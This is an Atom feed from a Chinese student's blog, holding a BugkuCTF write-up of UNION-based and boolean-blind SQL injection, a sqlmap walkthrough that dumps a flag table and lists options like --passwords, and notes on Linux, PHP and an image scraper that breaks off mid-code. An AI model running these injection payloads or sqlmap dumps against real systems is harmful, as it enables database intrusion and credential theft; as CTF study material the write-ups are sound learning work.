<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>A.binのBlog</title>
  
  
  <link href="https://abinix.top/atom.xml" rel="self"/>
  
  <link href="https://abinix.top/"/>
  <updated>2021-06-25T02:44:19.384Z</updated>
  <id>https://abinix.top/</id>
  
  <author>
    <name>A.bin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于SQL注入</title>
    <link href="https://abinix.top/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://abinix.top/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-05-19T12:29:21.000Z</published>
    <updated>2021-06-25T02:44:19.384Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BugkuCTF-web17-成绩表"><a href="#BugkuCTF-web17-成绩表" class="headerlink" title="BugkuCTF web17 成绩表"></a>BugkuCTF web17 成绩表</h1><p>先随便输入数字试试 输入1发现有回显</p><p><img src="https://www.hualigs.cn/image/60a503cc84ff6.jpg" alt="14"></p><p>根据传参可判断这是POST方式，测试一下是不是为sql注入，输入id=1后回显正常</p><p>加入单引号后发现回显不正常，判断为sql注入<img src="https://www.hualigs.cn/image/60a503d1e0df7.jpg" alt="15"></p><p>接下来用order by 语句判断列数</p><p><img src="https://www.hualigs.cn/image/60a503d31a22c.jpg" alt="16"></p><p>从4开始吧，构造id=1’ order by 4#，正常回显</p><p>当构造id=1’ order by 5#时，发现回显不正常</p><p><img src="https://www.hualigs.cn/image/60a503d3a9bf9.jpg" alt="17"></p><p>由此判断有4列</p><h3 id="之后尝试联合注入，需要把查询数据置空"><a href="#之后尝试联合注入，需要把查询数据置空" class="headerlink" title="之后尝试联合注入，需要把查询数据置空"></a>之后尝试联合注入，需要把查询数据置空</h3><blockquote><p>具体做法是：<strong>id=0’ union select 1,2,3,4#</strong></p></blockquote><h3 id="下面就猜测数据库的库名，版本信息，数据库用户"><a href="#下面就猜测数据库的库名，版本信息，数据库用户" class="headerlink" title="下面就猜测数据库的库名，版本信息，数据库用户"></a>下面就猜测数据库的库名，版本信息，数据库用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips： 没有顺序可言，因为第一个列是成绩单的姓名，所以我们可以把它设为null</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a503d47b1c2.jpg" alt="18"></p><h3 id="根据数据库skctf-flag去查询表名"><a href="#根据数据库skctf-flag去查询表名" class="headerlink" title="根据数据库skctf_flag去查询表名"></a>根据数据库skctf_flag去查询表名</h3><p>我们可以构造这么一个pyload，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select null,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user(),version()#</span></span><br></pre></td></tr></table></figure><p>大致意思就是将第二个列显示出它所有的表名</p><blockquote><p>这个**select group_concat(table_name) from information_schema.tables where table_schema=database() **可以暂且把它当作一个用来查询表名的固定格式</p></blockquote><p><img src="https://www.hualigs.cn/image/60a503d5b6888.jpg" alt="19"></p><p>我们得到了fl4g，可知flag在fl4g的表中，那么下一步我们需要做的就是查询此表中的字段名</p><p>构造pyload</p><blockquote><p>id=0’ union select null,(select group_concat(column_name) from information_schema.columns where table_name=’fl4g’),user(),version()#</p></blockquote><p>注意！！</p><p>这里fl4g是一个表，所以需要加单引号</p><p><img src="https://www.hualigs.cn/image/60a503d5a95a2.jpg" alt="20"></p><p>我们得到了 skctf_flag 字段 可知flag在这里了（皆大欢喜）</p><p>接下来就很简单了 直接构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select skctf_flag from fl4g</span><br></pre></td></tr></table></figure><p>可得 pyload</p><blockquote><p>id=0’ union select null,(select skctf_flag from fl4g),user(),version()#</p></blockquote><p><img src="https://www.hualigs.cn/image/60a503d5b68e7.jpg" alt="21"></p><p> 可得flag{aaab401ce593c5d4334e8c565a91b82e}</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><blockquote><p>布尔盲注就是存在注入的页面没有回显，没办法用select 1，2，3….#来判断页面的回显</p></blockquote><p><strong>既需要手工又需要脚本：</strong></p><p><a href="http://219.153.49.228/new_list.php?id=1">http://219.153.49.228/new_list.php?id=1</a> and length(database())&gt;10</p><p>用上述的length函数判断数据库长度</p><p>现当值为10的时候，页面就没有显示为false。那么说明database()的长度是10</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BugkuCTF-web17-成绩表&quot;&gt;&lt;a href=&quot;#BugkuCTF-web17-成绩表&quot; class=&quot;headerlink&quot; title=&quot;BugkuCTF web17 成绩表&quot;&gt;&lt;/a&gt;BugkuCTF web17 成绩表&lt;/h1&gt;&lt;p&gt;先随便输入数</summary>
      
    
    
    
    
    <category term="-SQL" scheme="https://abinix.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>关于SQLmap</title>
    <link href="https://abinix.top/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/"/>
    <id>https://abinix.top/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/</id>
    <published>2021-05-19T12:18:19.000Z</published>
    <updated>2021-06-29T01:08:29.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于SQLmap"><a href="#关于SQLmap" class="headerlink" title="关于SQLmap"></a>关于SQLmap</h1><p><strong>还是成绩单那个例子</strong></p><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” –dbs </p></blockquote><p>tips：因为是post方式，所以构造语句时需要加data=</p><p>– dbs 爆出数据库名称</p><p><img src="https://www.hualigs.cn/image/60a502ed628a0.jpg" alt="24"></p><p>如图：可以看到全部的数据库<img src="https://www.hualigs.cn/image/60a503490307e.jpg" alt="25"></p><h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>将数据库中的所有表爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf –tables</p></blockquote><p><img src="https://www.hualigs.cn/image/60a50351141ca.jpg" alt="26"></p><h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>知道了数据库 知道了表 我们将表中的字段名爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g –columns</p></blockquote><p>得到：</p><p>+————+————-+<br>| Column     | Type        |<br>+————+————-+<br>| skctf_flag | varchar(64) |<br>+————+————-+</p><h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>最后一步 爆字段内容</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g -C ‘skctf_flag’ –dump</p></blockquote><p>+—————————————-+<br>| skctf_flag                             |<br>+—————————————-+<br>| flag{aaab401ce593c5d4334e8c565a91b82e} |<br>+—————————————-+</p><h2 id="小结（sqlmap基本命令）"><a href="#小结（sqlmap基本命令）" class="headerlink" title="小结（sqlmap基本命令）"></a>小结（sqlmap基本命令）</h2><ul><li><p>曝出数据库名称 <strong>–dbs</strong></p></li><li><p>查看web当前使用的数据库 <strong>–current -db</strong></p></li><li><p>曝出web数据库使用账户    <strong>–current -user</strong></p></li><li><p>列出数据库所有账户    <strong>–users</strong></p></li><li><p>曝出数据库账号和密码    <strong>–passwords</strong></p></li><li><p>列出数据库中的表  <strong>-D XX –tables</strong> </p><p>(-D：指定数据库名称 XX：数据库名称 –    tables：列出该数据库的表)</p></li><li><p>列出表中的字段 <strong>-D XX -T YY –columns</strong> </p></li></ul><p>（-D指数据库名称 XX指数据库 -T指要列出字段的表  YY指数据库中的表 –columns指字段）</p><ul><li><p>曝字段内容 <strong>-D XX -T YY -C ”a,b,c” –dump</strong> </p><p>(-D指数据库名称 XX指数据库 -T指要列出字段的表 YY指数据库中的表 -C指定要曝的字段 –dump将结果导出)</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于SQLmap&quot;&gt;&lt;a href=&quot;#关于SQLmap&quot; class=&quot;headerlink&quot; title=&quot;关于SQLmap&quot;&gt;&lt;/a&gt;关于SQLmap&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;还是成绩单那个例子&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;第一步：&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="-sql" scheme="https://abinix.top/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础指令</title>
    <link href="https://abinix.top/2021/04/22/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/04/22/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-04-22T10:50:00.000Z</published>
    <updated>2021-05-09T06:45:51.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1.基础命令"></a>1.基础命令</h1><h2 id="1）文件处理命令"><a href="#1）文件处理命令" class="headerlink" title="1）文件处理命令"></a>1）文件处理命令</h2><h4 id="1-ls命令（目录处理命令）"><a href="#1-ls命令（目录处理命令）" class="headerlink" title="1.ls命令（目录处理命令）"></a><strong>1.ls命令（目录处理命令）</strong></h4><ul><li>​            ls 展示根目录下的文件</li></ul><ul><li>​            ls-a显示所有文件</li></ul><ul><li><p>​            ls-l 详细信息显示</p><ul><li>第三部分为所有者、第四部门为所属组、第五部分为文件大小(-h为人性化显示)</li></ul></li><li><p>开头十个字符：例：-rw-r–r–</p><ul><li>u(所有者)  g(所属组)  o(其他人)   （每三个一组）</li><li>​                r读         w写        x执行</li><li>表示文件、 d 表示目录、 l 为软链接（最常见的三种）</li></ul></li><li><p>​            ls-d 查看目录属性</p></li><li><p>​            目录处理命令</p><ul><li>mkdir、cd 、pwd（显示当前所在目录，绝对路径）、rmdir（删除空目录）、cp    </li><li>mkdir -p[目录名]  创建新目录  -p 递归创建</li><li>cd / （进入目录）  cd..(回到上一级目录)</li><li>cp -r （复制目录） 例：cp-r /要复制的目录/复制到哪      cp-p （保留文件属性）</li></ul></li></ul><p>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-基础命令&quot;&gt;&lt;a href=&quot;#1-基础命令&quot; class=&quot;headerlink&quot; title=&quot;1.基础命令&quot;&gt;&lt;/a&gt;1.基础命令&lt;/h1&gt;&lt;h2 id=&quot;1）文件处理命令&quot;&gt;&lt;a href=&quot;#1）文件处理命令&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="-Linux" scheme="https://abinix.top/categories/Linux/"/>
    
    
    <category term="-Linux" scheme="https://abinix.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>PHP学习笔记</title>
    <link href="https://abinix.top/2021/04/21/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/04/21/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-04-21T15:50:34.000Z</published>
    <updated>2021-06-25T01:21:03.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-PHP基本语法"><a href="#1-PHP基本语法" class="headerlink" title="1.PHP基本语法"></a>1.PHP基本语法</h1><h2 id="1-1PHP概念"><a href="#1-1PHP概念" class="headerlink" title="1.1PHP概念"></a>1.1PHP概念</h2><ul><li><p>PHP的主要目标是允许网络开发人员快速编写动态页面。</p></li><li><p>细化点说PHP可以用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服            务器端文件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他            相关操作！</p></li><li><p>PHP是脚本语言不需要事先编译,在服务器端运行！ </p><h2 id="1-2PHP语法"><a href="#1-2PHP语法" class="headerlink" title="1.2PHP语法"></a>1.2PHP语法</h2></li></ul><ul><li><p>PHP开始标记<br>​        <code>&lt;?php</code></p></li><li><p>PHP结束标记<br>​                <code>?&gt;</code></p></li><li><p>在一些PHP语句的结尾要加上(功能执行语句){在结构定义语句可以不用分号},分号表示一句话的结束,?&gt;就隐含一个分号，所以PHP代码最后一行可以不加分号。<br>​注释<br>​            多行注释:/<em>……</em>/<br>​            单行注释://</p></li><li><p>换行符 得加引号</p></li></ul><p>​             ‘<b>‘</p><h2 id="1-3变量"><a href="#1-3变量" class="headerlink" title="1.3变量"></a>1.3变量</h2><ul><li>PHP程序中使用变量不需要声明，这是python和c的不同</li></ul><ul><li>变量的销毁：unset($变量名称)</li></ul><ul><li>变量的命名规则：</li></ul><p>​                1）严格区分大小写</p><p>​                2）字母或下划线开头</p><p>​                3）最好不要用关键字作为变量</p><ul><li><p>可变变量<br>​         1）$abc=’test’; //定义了一个变量$abc里面存了值test<br>​         2）$$abc=’孙胜利’; //$test=’孙胜利’;</p></li><li><p>变量类型            </p></li></ul><p>​                1）bool (布尔型) 存放ture与flase<br>                2）int (整型)<br>                3）float (浮点型，也称double）</p><p>​                4）string (在定义一些简单的字符串的时候使用单引号这种方法效率比较高！）<br>​                5）定界符（同样可以表示变量，用&lt;&lt;&lt;）</p><p>​                    如：</p><p>​                    $a=&lt;&lt;&lt;www<br>​                   dwqdqwdwq{$b}dwqdqdqdqdwqdwqcwcfwefwefcscwecwefwdqwdqdefwefwefewfwe<br>​                   www; </p><p>​                 6）array (数组)<br>                 7）object (对象)<br>                 8）resource (资源)<br>​                 9）NULL（null表示一个变量没有值，表示空）</p><h2 id="1-4常量"><a href="#1-4常量" class="headerlink" title="1.4常量"></a>1.4常量</h2><!--“var_dump”是PHP中的调试函数，用于判断一个变量的类型与长度，并输出变量的数值。--><ul><li>定义和使用<br>​                    define(‘常量名称’,常量值) 或者 define(“常量名称”,常量值)<br>​                    常量的命名和变量一样 只能包含字母数字下划线 并且必须以字母或者下划线开头（通   常是大写）<br>​                    defined()函数来检查是否定义了某个常量</li></ul><ul><li>预定义常量（也叫魔术常量）</li></ul><p>​                    通常以__开头 常用的有：</p><p>​                    <strong><code>__LINE__</code></strong> 、 **<code>__FILE__ 、__DIR__</code><strong>、</strong><code>__FUNCTION__</code><strong>、</strong><code>__CLASS__</code><strong>、</strong><code>__TRAIT__</code>**、                     **<code>__METHOD__</code><strong>、</strong><code>__NAMESPACE__</code>**、</p><h2 id="1-5运算符"><a href="#1-5运算符" class="headerlink" title="1.5运算符"></a>1.5运算符</h2><!--总体与py、c差不多（省略）--><p>​        <strong>++ 自增</strong><br>​                前++<br>​                    当在一个语句里面需要使用到被自增的变量的值的时候，前++会先执行自增,然后再返回自                    增之后的值！<br>​                后++<br>​                    当在一个语句里面需要使用到被自增的变量的值的时候，后++会先返回变量的值然后再去                    执行自增</p><ul><li><p>字符串运算符<br>​                . 连接运算符<br>​                $a=’孙胜利’;<br>​                $b=’测试字符串连接符’;<br>​                echo $a.$b;</p></li><li><p>逻辑运算符 （参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转换成布尔类型的值，然后再参与运算！）</p></li></ul><p>​                     逻辑异或：xor</p><ul><li>其他运算符</li></ul><p>​                1）?  :  （三元运算）<br>​                格式：<br>​                    表达式1 ? 表达式2 : 表达式3;<br>​                    如果表达式1的值为true,那么就执行表达式2,否则那么就执行表达式3</p><p>​                2）``</p><p>​                可以把系统的命令放在里面执行！例如：$a=`ipconfig`\</p><p>​                3）@  屏蔽表达式可能发生的错误！或者不想显示此处的错误</p><p>​                4）=&gt;<br>​                5）-&gt;<br>​                6）instanceof 确定一个 PHP 变量是否属于某一类</p><h2 id="1-6流程控制"><a href="#1-6流程控制" class="headerlink" title="1.6流程控制"></a>1.6流程控制</h2><ul><li>if<!--与c和python使用相同--></li></ul><p>​                    if(){</p><p>​                            }else{</p><p>​                                        }</p><ul><li>switch<!--与c和python使用相同--></li></ul><p>​                1）不要忘记break语句！来跳出switch语句！每个case语句后面都加上break</p><p>​                2）case后面的语句块是不需要{}括起来的</p><ul><li><p>while和do while<!--与c和python使用相同--></p><p>​    与while语句区别就是，do while语句至少会执行一次！</p></li><li><p>for<!--与c使用相同--></p></li></ul><p>​                for(表达式a;表达式b;表达式c){<br>​                    各种语句<br>​                    }</p><ul><li>流程控制语句</li></ul><p>​                1）.break语句<br>​                    作用：用于switch语句，for，while，do…while，foreach，用于中断这些语句！<br>​                    后面可以接上一个数字来表示跳出几层循环！默认不加就是跳出当前循环语句！<br>​                2）.continue语句<br>​                    作用：只能用在循环语句，跳出本次循环，并不是结束整个循环语句！<br>​                3）.exit()语句或die()语句<br>​                    作用：结束当前整个程序的执行！ 函数输出一条消息，并退出当前脚本。</p><h2 id="1-7函数"><a href="#1-7函数" class="headerlink" title="1.7函数"></a>1.7函数</h2><ul><li>function 函数名([形式参数1,形式参数2,….形式参数n]){</li></ul><p>​                }</p><ul><li><p>PHP变量的范围<br>​            1.<u>局部变量</u><br>​                function test(){<br>​                $a=1;//局部变量$a，尽在这个函数内部有效<br>​                }<br>​                echo $a;</p></li><li><p>全局变量<br>​                <code>$i=10;//全局变量（外部变量）</code><br><code>​                define(&#39;MY_NAME&#39;,&#39;孙胜利&#39;);</code><br><code>​                function test()&#123;</code><br><code>​                echo MY_NAME;</code><br><code>​                **&lt;u&gt;*global*&lt;/u&gt;** $i;//声明$i为全局变量,然后再这个函数内部就可以使用$i</code><br><code>​                echo $i;</code><br><code>​                $a=1;</code><br><code>​                &#125;</code><br><code>​                test();</code></p></li><li><p>静态变量<br>​                function test(){<br>​                static $a=10;//静态变量$a,初始化静态变量,尽在第一次调用的时候执行<br>​                echo ++$a;//当第二次执行这个函数的时候$a这个变量依然存在并且里面的也值依然存   在！<br>​                }</p></li><li><p>参数的传递</p></li></ul><p>​                1）按值传递参数<!--默认,最常用--></p><p>​                        <code>function test($a)&#123;&#125;</code></p><p>​                        <code>$i=10</code></p><p>​                        <code>text($i)</code></p><p>​                2）按引用传递参数(相当于形式参数和实际参数指的是同一个)</p><p>​                        <code>function text(&amp;$a)&#123;&#125;</code></p><p>​                        <code>$i=10</code></p><p>​                        <code>text($i)       /* $i的值始终与$a相等*/</code></p><p>​                3）函数的默认参数</p><p>​                        给形式参数加默认值的时候是重右往左加的    </p><p>​                4）.可变长度参数列表</p><p>​                        func_get_args();（可以调用函数里的全部参数）<br>​                        func_get_arg();（类似数组，括号里输入数字可以获取第几个实参）<br>​                        func_num_args();（获取调用的参数数量）</p><ul><li><strong>递归函数</strong></li></ul><p>​        <!--递归函数即在函数内部自己调用自己的函数--><br>​            1）里面的变量默认都是局部变量，相互之间没有影响！没有联系，只是存储了数据。<br>​            2）递归函数，在函数的内部需要有适时结束函数运行的条件！</p><p>​            3）为什么要回归？</p><p>​            因为之前的程序没执行完，只执行了if语句，当n=0时返回上一级调用它的地方，即输出<code>%n.&amp;nbsp</code></p><p><img src="https://www.hualigs.cn/image/608048d14d355.jpg" alt="递归函数图例"></p><h2 id="1-8数组"><a href="#1-8数组" class="headerlink" title="1.8数组"></a>1.8数组</h2><ul><li>array()函数  变量名称[索引值]=数据    变量名称[]=数据  （从0开始） 也可用索引值=&gt;数据            导入</li></ul><p>​                                 多维数组：变量名称[]]]</p><ul><li>数组遍历</li></ul><p>​                1）for循环<br>​                2）foreach语句</p><p>​                            <code>foreach(数组变量 as 变量1)&#123;</code></p><p>​                                    <code>echo 变量1;</code></p><p>​                            <code>&#125;</code></p><p>​                            <code>foreach(数组变量 as 变量1=&gt;变量2)&#123;</code></p><p>​                                    <code>echo 变量1.&#39;=&gt;&#39;.变量2;</code></p><p>​                            <code>&#125;</code></p><h2 id="PHP弱类型比较"><a href="#PHP弱类型比较" class="headerlink" title="PHP弱类型比较"></a>PHP弱类型比较</h2><p> <strong>1.****==与===</strong></p><p>==为弱相等，也就是说12==”12” –&gt; true，而且12==”12cdf” –&gt; true，只取字符串中开头的整数部分，但是1e3dgf这样的字符串在比较时，取的是符合科学计数法的部分：1e3，也就是1000.</p><p>而且bool类型的true和任意字符串的弱类型相等</p><p>===为完全相等，数据类型和值都相等时返回true。</p><h2 id="CTF中见到过的函数整理"><a href="#CTF中见到过的函数整理" class="headerlink" title="CTF中见到过的函数整理"></a>CTF中见到过的函数整理</h2><ul><li>in_array（$x1,$x2）（判断x1是否匹配x2，或在不在数组中）</li><li>is_string（判断是否为字符串）</li><li>mb_substr（$page，0，2）（是一个截断函数，返回0—2之间的内容）</li><li>mb_strpos（查找字符串在另一个字符串中首次出现的位置）</li><li>strstr（””$1”,”$2”）（查找 “$2” 在 “$1” 中是否存在，如果是，返回该字符串及后面剩余部分：）</li><li>str_replace(“$1”,”$2”,”$3”)（把$3中的字符$1替换成$2）</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-PHP基本语法&quot;&gt;&lt;a href=&quot;#1-PHP基本语法&quot; class=&quot;headerlink&quot; title=&quot;1.PHP基本语法&quot;&gt;&lt;/a&gt;1.PHP基本语法&lt;/h1&gt;&lt;h2 id=&quot;1-1PHP概念&quot;&gt;&lt;a href=&quot;#1-1PHP概念&quot; class=&quot;</summary>
      
    
    
    
    <category term="-PHP" scheme="https://abinix.top/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>爬虫与面向对象爬虫</title>
    <link href="https://abinix.top/2021/04/21/%E7%88%AC%E8%99%AB/"/>
    <id>https://abinix.top/2021/04/21/%E7%88%AC%E8%99%AB/</id>
    <published>2021-04-21T10:50:00.000Z</published>
    <updated>2021-06-25T02:43:38.096Z</updated>
    
    <content type="html"><![CDATA[<h1 id="普通面向对象（爬取burst-shopify-com下的图片）"><a href="#普通面向对象（爬取burst-shopify-com下的图片）" class="headerlink" title="普通面向对象（爬取burst.shopify.com下的图片）"></a>普通面向对象（爬取burst.shopify.com下的图片）</h1><h3 id="总体思想"><a href="#总体思想" class="headerlink" title="总体思想:"></a><strong>总体思想</strong>:</h3><ol><li>​    观察网页构造，为写代码做准备，检查是否有反爬技术</li><li>​    检查所要下载的图片，观察格式，并且构造正则表达式</li><li>​    过滤重复的图片</li><li>​    保存图片，并作相关优化</li></ol><h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line">j=<span class="number">1</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#x27;animals&#x27; &#x27;city&#x27; &#x27;home&#x27; &#x27;seasons&#x27; &#x27;education&#x27; &#x27;landscape&#x27; &#x27;family&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;love&#x27; &#x27;around the world&#x27; &#x27;arts&#x27; &#x27;technology&#x27; &#x27;outdoor&#x27; &#x27;backgrounds&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;fashion&#x27; &#x27;beauty&#x27; &#x27;people&#x27; &#x27;transportation&#x27; &#x27;business&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;fitness&#x27; &#x27;travel&#x27; &#x27;flowers&#x27; &#x27;work&#x27; &#x27;food&#x27; &#x27;holidays&#x27; &#x27;celebrate&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#&#123;设置头，反爬&#125;</span></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">key = <span class="built_in">input</span>(<span class="string">&#x27;请从上面挑选出要下载的图片类型：&#x27;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一共要下载的页数：&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;请求url与编写正则表达式&#125;</span></span><br><span class="line"><span class="keyword">if</span> num &gt;= <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> j &lt;= num:</span><br><span class="line">        url = <span class="string">&#x27;https://burst.shopify.com/&#x27;</span> + key + <span class="string">&#x27;?page=&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        resp=requests.get(url,headers=headers)</span><br><span class="line">        html=resp.text</span><br><span class="line">        urls=re.findall(<span class="string">&quot;https://burst.*?jpg&quot;</span>, html)</span><br><span class="line">        lst=[]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;当第二页刷新时有和第一页相同的图片,所以以下为去重代码&#125;</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> urls:   <span class="comment">#遍历jpg</span></span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line">                    lst.append(i)</span><br><span class="line">        <span class="keyword">elif</span> j&gt;<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst2 <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst:  <span class="comment">#判断新urls里的jpg是否与lst列表里的相同</span></span><br><span class="line">                    lst.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;保存图片&#125;</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> lst:</span><br><span class="line">            file_name =<span class="string">&quot;E:/大学/python爬虫/&quot;</span>+ <span class="built_in">str</span>(j) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&quot;.jpg&quot;</span>   <span class="comment">#设置文件名</span></span><br><span class="line">            resp = requests.get(url, headers=headers)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:    <span class="comment">#以二进制的方式写进</span></span><br><span class="line">                f.write(resp.content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在下载第&#123;0&#125;页第&#123;1&#125;张图片&quot;</span>.<span class="built_in">format</span>(j,x))</span><br><span class="line">            x=x+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;计数部分&#125;</span></span><br><span class="line">            <span class="keyword">if</span> x==<span class="built_in">len</span>(lst):</span><br><span class="line">                <span class="keyword">if</span> j != <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">pass</span>        <span class="comment"># 这一部分if指lst2=lst只执行一次，</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lst2 = lst</span><br><span class="line">                x=<span class="number">0</span></span><br><span class="line">                j=j+<span class="number">1</span></span><br><span class="line">                count += <span class="built_in">len</span>(lst)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;下载完成！共下载&#123;0&#125;张图片&quot;</span>.<span class="built_in">format</span>(count))</span><br></pre></td></tr></table></figure><h1 id="面向对象爬虫（爬取burst-shopify-com下的图片）"><a href="#面向对象爬虫（爬取burst-shopify-com下的图片）" class="headerlink" title="面向对象爬虫（爬取burst.shopify.com下的图片）"></a>面向对象爬虫（爬取burst.shopify.com下的图片）</h1><p>​    所谓面向对象也就是通过创建一个类，再创建若干个对象，然后再统一调动</p><h3 id="代码如下：-1"><a href="#代码如下：-1" class="headerlink" title="代码如下："></a>代码如下：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 